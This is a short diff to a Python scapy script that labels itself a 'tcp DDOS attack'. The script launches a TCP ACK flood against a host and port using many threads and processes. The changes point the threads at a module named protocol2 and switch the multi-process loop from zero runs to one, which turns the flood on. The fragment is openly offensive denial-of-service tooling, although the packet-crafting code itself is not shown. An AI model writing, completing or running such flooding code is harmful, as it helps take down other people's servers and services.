@@ -3,6 +3,7 @@
 from scapy.all import *
 import multiprocessing
 import threading
+import protocol2
 
 """tcp DDOS attack"""
 
@@ -22,7 +23,8 @@ def tcp_ack(h,p):
 def mutil_threading():
     job = []
     for i in range(80):
-        t = threading.Thread(target=tcp_ack,args=(host,port))
+        #t = threading.Thread(target=protocol.run,args=(host,port))
+        t = threading.Thread(target=protocol2.run,args=())
         job.append(t)
         t.start()
     for j in job:
@@ -37,7 +39,7 @@ if __name__ == "__main__":
     print('attack is start..')
     tcp_ack(host,port)
     try:
-        for i in range(0):
+        for i in range(1):
             multi_process(5)
     except KeyboardInterrupt:
         print('attack end')
